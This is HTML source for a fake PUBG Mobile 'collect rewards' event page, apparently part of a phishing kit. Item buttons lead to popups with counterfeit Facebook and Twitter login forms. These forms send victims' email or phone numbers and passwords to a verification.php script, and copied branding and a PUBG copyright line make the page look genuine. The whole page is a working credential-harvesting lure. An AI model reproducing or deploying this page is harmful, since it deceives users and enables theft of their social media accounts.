<img style="border-bottom: 0px;" src="https://i.ibb.co/5x1w88X/28.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/5x1w88X/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/R0rQvw4/29.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/R0rQvw4/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/27fMpPf/30.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/27fMpPf/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cTcRJCZ/31.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cTcRJCZ/31.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WPFTmgN/32.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WPFTmgN/32.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h8n8jN/33.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0h8n8jN/33.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3WdQMkQ/34.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3WdQMkQ/34.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n6KkVTX/35.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n6KkVTX/35.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pWR4WQ1/36.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pWR4WQ1/36.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6DmJkWp/37.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/6DmJkWp/37.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sT1w13/38.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9sT1w13/38.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQtBL6z/39.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PQtBL6z/39.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Gk99ZQY/40.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Gk99ZQY/40.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/P44sdBP/41.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/P44sdBP/41.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0MhX7pL/42.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0MhX7pL/42.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6PYCWg/43.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c6PYCWg/43.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qsw53N6/44.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qsw53N6/44.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rQ7NY9z/45.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/rQ7NY9z/45.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X3CBhhv/46.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/X3CBhhv/46.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KLQY3Vg/47.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/KLQY3Vg/47.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nMmZ2Rc/48.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/nMmZ2Rc/48.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XS1D33m/49.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/XS1D33m/49.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQNxt7B/50.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PQNxt7B/50.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="weapon">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/5xvV1TP/m24.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/5xvV1TP/m24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/fFQfP42/GR-7.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/fFQfP42/GR-7.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wzmCg1L/a1.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wzmCg1L/a1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/jRZxtbP/a2.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/jRZxtbP/a2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/NtHMgmF/a3.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/NtHMgmF/a3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/JK5QkCq/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/JK5QkCq/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N1Kh4DJ/m249.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N1Kh4DJ/m249.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n0jsqH6/1.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n0jsqH6/1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/tC7gGKh/2.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tC7gGKh/2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HdCPbym/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HdCPbym/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/zHXhQmQ/8.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/zHXhQmQ/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hcnPCFM/9.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hcnPCFM/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S78nnmC/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/S78nnmC/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Lk3B2mw/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Lk3B2mw/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YpbSGGN/3.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YpbSGGN/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/54C3TwS/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/54C3TwS/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/8rwnBbf/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8rwnBbf/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/JyKsRV9/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/JyKsRV9/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9NW5RBs/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9NW5RBs/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DrzYVS0/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DrzYVS0/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3cM96Bn/3.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3cM96Bn/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/30shkpG/4.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/30shkpG/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DYcd3r8/5.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DYcd3r8/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m5MfkNp/6.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/m5MfkNp/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hG72h9/7.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0hG72h9/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c232k1x/8.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c232k1x/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/smrqkwd/9.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/smrqkwd/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/stysM7v/10.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/stysM7v/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WgYyGnw/11.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WgYyGnw/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pdYW33J/12.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pdYW33J/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N9XVcKh/13.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N9XVcKh/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X8Y41sj/14.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/X8Y41sj/14.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mhWQMvq/15.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mhWQMvq/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rjh4zr4/16.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Rjh4zr4/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qB0F8jV/17.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qB0F8jV/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n8pTPFf/18.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n8pTPFf/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rkkQqXM/20.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/rkkQqXM/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/jTsg4BQ/21.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/jTsg4BQ/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/v332bhy/4.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/v332bhy/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sw3NZK/5.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9sw3NZK/5.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="other">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/3.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/4.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/5.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/6.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/7.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/8.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/9.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/10.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/11.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/12.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/13.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/14.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/14.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/15.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/16.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/17.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/19.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/20.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/21.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/22.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/22.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/23.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/23.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/24.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/25.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/25.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/26.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/27.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/27.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/28.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/29.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/30.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/31.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/31.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/32.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/32.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/33.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/33.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/34.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/34.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/35.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/35.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/36.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/36.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/37.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/37.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</div> <!--- box --->
<div class="footer">
<img src="img/footer_img.png">
<div class="footer-txt">&copy; 2018-2021 PUBG CORPORATION. All rights reserved.</div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="popup-content">
<br>
<div class="popup-rewards-title">Are you sure to collect this rewards?</div>
<img class="popup-rewards-img1" src="" id="myRewardImg">
</div>
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-deactive" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" class="popup-btn-active" onclick="open_account_login()">Collect</button>
</div>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="popup-content">
<br>
<div class="popup-rewards-title">Log in with your PUBG MOBILE account to continue</div>
<img class="btn-login" src="img/btn_fb.png" onclick="open_facebook();">
<img class="btn-login" src="img/btn_twitter.png" onclick="open_twitter();">
</div>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="verification.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<img src="https://i.ibb.co/W0V2vPK/twitter-text.png">
		</div>
		<br>
		<br>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="form-group">
				<input type="text" name="email" autocomplete="off" required>
				<label>Phone/email/username</label>
				</div>
				<div class="form-group">
				<input type="password" name="password" autocomplete="off" required>
				<label>Password</label>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>